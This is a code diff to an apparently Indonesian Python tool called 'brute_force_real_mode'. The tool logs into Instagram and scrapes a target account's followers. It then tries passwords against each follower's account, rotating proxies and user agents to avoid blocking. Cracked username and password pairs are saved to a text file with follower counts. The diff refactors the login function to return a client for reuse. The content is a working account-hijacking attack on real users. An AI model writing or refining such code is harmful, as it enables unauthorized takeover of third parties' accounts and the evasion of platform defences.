@@ -21,8 +21,8 @@ def brute_force_real_mode():
     password_login = input(Fore.YELLOW + "Password IG login: ").strip()
 
     print(Fore.CYAN + "🔄 Mencoba login...")
-    success = login_real(username_login, password_login)
-    if not success:
+    cl = login_real(username_login, password_login)
+    if not cl:
         print(Fore.RED + "❌ Login gagal. Username/password salah atau terblokir.")
         return
 
@@ -32,10 +32,6 @@ def brute_force_real_mode():
 
     target_username = input(Fore.YELLOW + "Masukkan username target Instagram: ").strip()
     print(Fore.YELLOW + f"\n🔍 Scraping followers dari: {target_username} ...")
-
-    from instagrapi import Client
-    cl = Client()
-    cl.login(username_login, password_login)
 
     followers = scrape_followers(cl, target_username)
     if not followers:
@@ -62,9 +58,9 @@ def brute_force_real_mode():
             proxy = random.choice(proxies) if proxies else None
             ua = random.choice(user_agents) if user_agents else None
 
-            success = login_real(username, pwd, user_agent=ua, proxy=proxy)
-            if success:
-                info = get_user_info(username)
+            cl_target = login_real(username, pwd, user_agent=ua, proxy=proxy)
+            if cl_target:
+                info = get_user_info(cl_target, username)
                 hasil = f"{username}|{pwd}|followers:{info['followers']}|following:{info['following']}|posts:{info['posts']}\n"
                 print(Fore.GREEN + f"✅ Sukses: {hasil.strip()}")
                 with open("hasil_login_berhasil.txt", "a") as f:
